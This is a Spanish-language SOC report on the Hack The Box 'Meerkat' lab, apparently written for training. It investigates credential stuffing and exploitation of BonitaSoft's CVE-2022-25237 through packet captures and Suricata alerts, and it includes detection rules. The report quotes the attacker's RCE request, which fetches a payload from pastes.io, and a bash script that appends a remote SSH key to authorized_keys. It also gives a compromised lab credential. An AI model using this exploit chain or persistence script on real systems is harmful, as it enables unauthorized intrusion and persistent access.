### [HTB_MEERKAT] — Informe Técnico de SOC & Threat Hunting

**Clasificación:** TLP:AMBER (Uso Interno — SOC / Incident Response)  
**Plataforma / Entorno:** Wireshark / Tshark / Suricata NIDS Alert Triage / Splunk ES  
**Objetivo / Infraestructura:** Servidor Web BonitaSoft (172.31.6.44:8080) / Dominio forela.co.uk

#### 1. Escenario y Contexto de la Amenaza

- **Resumen Ejecutivo:** Se investigó un incidente de intrusión contra la plataforma de gestión empresarial BonitaSoft (forela.co.uk:8080). El análisis correlacionado del archivo de captura de red (meerkat.pcap) y las alertas NIDS (meerkat-alerts.json) confirmó un ataque estructurado en dos etapas conducido desde la dirección IP externa 156.146.62.213. Inicialmente, el adversario desplegó un ataque automatizado de Credential Stuffing mediante scripts en Python contra el endpoint /bonita/loginservice, comprometiendo las credenciales corporativas del usuario seb.broom@forela.co.uk. Posteriormente, explotó la vulnerabilidad de omisión de autorización **CVE-2022-25237** en la API REST mediante la inyección del parámetro ;i18ntranslation, logrando Ejecución Remota de Código (RCE). El atacante descargó un payload desde pastes.io que insertó una clave pública no autorizada en /home/ubuntu/.ssh/authorized_keys, garantizando persistencia administrativa en el servidor Linux subyacente.
    
- **Fuentes de Telemetría y Contenido del Dataset:** Captura de paquetes meerkat.pcap (7.3 MiB) y registro de alertas de Suricata NIDS en formato EVE/JSON (meerkat-alerts.json). Protocolos analizados: HTTP, TLSv1.3, TCP y SSH. Delimitación temporal: intrusión detectada el 19 de enero de 2023 entre las 15:29:00 y las 15:40:00 UTC.
    

#### 2. Mapeo Táctico MITRE ATT&CK®

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica / Subtécnica|Nombre de la Técnica|Evidencia / Log Específico Hallado|
|**Credential Access**|T1110.004|Brute Force: Credential Stuffing|118 peticiones POST automatizadas contra /bonita/loginservice con User-Agent python-requests/2.28.1.|
|**Initial Access / Execution**|T1190|Exploit Public-Facing Application|Explotación de CVE-2022-25237 en la API REST de BonitaSoft usando el string de bypass i18ntranslation.|
|**Execution**|T1059.004|Command and Scripting Interpreter: Unix Shell|Invocación remota de wget https://pastes.io/raw/bx5gcr0et8 a través de /bonita/API/extension/rce.|
|**Persistence**|T1098.004|Account Manipulation: SSH Authorized Keys|Modificación del archivo /home/ubuntu/.ssh/authorized_keys mediante la clave pública hffgra4unv.|
|**Discovery**|T1087.001|Account Discovery: Local Account|Ejecución del comando cat /etc/passwd tras la explotación inicial.|

#### 3. Cadena de Investigación Forense y Análisis de Telemetría

- **Hipótesis de Búsqueda:** Identificar la aplicación web que genera alertas de alta severidad y aislar la IP pública de origen del tráfico HTTP anómalo.
    
- **Consultas y Comandos Operativos:**
    


``` bash
jq -r '.[] | select(.alert.category | contains("Administrator Privilege Gain")) | [.timestamp, .src_ip, .dest_ip, .alert.signature] | @tsv' meerkat-alerts.json | sort -u
tshark -r meerkat.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri | head -n 10
```

- **Desglose Técnico de Evidencias:**
    
    - El sistema de detección alertó sobre intentos de ganancia de privilegios administrativos contra el host interno **172.31.6.44** en el puerto TCP 8080.
        
    - El tráfico HTTP confirmó que el servicio corresponde a la suite de BPM **BonitaSoft** (versión Bonita Web 2021.2).
        
    - La dirección IP externa atacante se identificó de forma concluyente como **156.146.62.213**.
        

- **Hipótesis de Búsqueda:** Cuantificar el volumen de combinaciones de credenciales transmitidas por el atacante e identificar la cuenta comprometida.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r meerkat.pcap -Y "http.request.method == \"POST\" && http.request.uri == \"/bonita/loginservice\"" -T fields -e text | grep -v "username=install" | sort -u | wc -l
tshark -r meerkat.pcap -Y "http.response.code == 204 && http.prev_request_in" -T fields -e frame.number -e http.prev_request_in
```

- **Desglose Técnico de Evidencias:**
    
    - El atacante envió 118 peticiones POST utilizando el User-Agent python-requests/2.28.1.
        
    - Descartando las peticiones con credenciales de prueba por defecto (install:install), se identificaron exactamente **56 combinaciones únicas de credenciales corporativas probadas**.
        
    - La combinación exitosa que obtuvo una redirección/autenticación válida (código HTTP 204/302) correspondió a:  
        **seb.broom@forela.co.uk:g0vernm3nt**.
        

- **Hipótesis de Búsqueda:** Identificar anomalías en los patrones de URI de la API REST que indiquen bypass de los filtros de autorización.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r meerkat.pcap -Y "http.request.uri contains \"i18ntranslation\"" -T fields -e frame.time -e ip.src -e http.request.uri
```

- **Desglose Técnico de Evidencias:**
    
    - **Identificador de Vulnerabilidad:** **CVE-2022-25237**.
        
    - **Cadena de Bypass Inyectada:** El exploit manipuló el filtro RestAPIAuthorizationFilter anexando la cadena **i18ntranslation** a la ruta de la API (/bonita/API/extension/rce;i18ntranslation o similar).
        
    - Con esta evasión, el atacante ejecutó comandos no autenticados en el sistema operativo:
        


``` TEXT
GET /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8 HTTP/1.1
```

- **Hipótesis de Búsqueda:** Rastrear las conexiones externas salientes originadas desde el servidor web hacia plataformas públicas de almacenamiento de código.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r meerkat.pcap -Y "http.request.uri contains \"pastes.io\" || tls.handshake.extensions_server_name contains \"pastes.io\"" -T fields -e frame.time -e ip.dst -e tls.handshake.extensions_server_name
```

- **Desglose Técnico de Evidencias:**
    
    - **Plataforma Externa:** **pastes.io**.
        
    - El comando wget descargó el script bx5gcr0et8, el cual ejecutó una segunda petición contra el archivo de clave pública: **hffgra4unv**.
        
    - Contenido del script ejecutado en el servidor:
        


``` bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

- **Archivo Modificado:** **/home/ubuntu/.ssh/authorized_keys**.
    
- **Técnica MITRE:** **T1098.004** (SSH Authorized Keys).
    

#### 4. Ingeniería de Detección (Reglas de Alerta & Correlación)


``` Suricata
alert http $EXTERNAL_NET any -> $HTTP_SERVERS 8080 (msg:"SOC - Intento de Bypass de Autorizacion en BonitaSoft (CVE-2022-25237)"; flow:to_server,established; http.uri; content:"/bonita/API/"; content:"i18ntranslation"; fast_pattern; classtype:web-application-attack; sid:20260403; rev:1;)
```

- **Consideraciones de Falso Positivo:** Ninguna en operaciones estándar, ya que i18ntranslation no debe figurar en llamadas REST API hacia extensiones RCE.
    
- **Tuning:** Asegurar que la regla inspeccione tanto URIs que usen ; como delimitador como secuencias de path traversal (/../i18ntranslation/).
    


``` SPL
index=os_logs sourcetype=auditd (comm="curl" OR comm="wget" OR comm="bash" OR comm="sh") 
| search a0="*/.ssh/authorized_keys" OR a1="*/.ssh/authorized_keys" OR a2="*/.ssh/authorized_keys"
| where uid=user_web OR user="tomcat" OR user="bonita" OR user="www-data"
| stats count min(_time) as inicio max(_time) as fin values(comm) as binario values(a1) as destino by host, user
| convert ctime(inicio) ctime(fin)
| table inicio, fin, host, user, binario, destino, count
```

- **Consideraciones de Falso Positivo:** Aprovisionamiento automático de llaves SSH mediante Ansible/Puppet.
    
- **Tuning:** Filtrar únicamente cuentas de servicio web que jamás deben interactuar con llaves SSH interactivas.
    

#### 5. Recomendaciones de Contención, Remedición y Hardening

1. **Aislamiento del Servidor Web:** Desconectar el servidor 172.31.6.44 de la red mediante aislamiento por VLAN o EDR.
    
2. **Erradicación de Claves SSH Hostiles:** Inspeccionar /home/ubuntu/.ssh/authorized_keys y /root/.ssh/authorized_keys, eliminando la clave pública hffgra4unv asociada al atacante.
    
3. **Bloqueo Perimetral:** Bloquear el tráfico entrante de la IP 156.146.62.213 y el tráfico saliente hacia el dominio pastes.io.
    

4. **Actualización de Seguridad (Parcheo):** Actualizar inmediatamente la plataforma BonitaSoft a una versión no vulnerable (≥≥ 2021.2 SP1 / 2022.1) que corrija la validación de URLs en RestAPIAuthorizationFilter.
    
5. **Restricción de Egress Filtering:** Prohibir que los servidores de aplicaciones web inicien conexiones HTTP/HTTPS salientes no autenticadas hacia repositorios de código o sitios de paste públicos.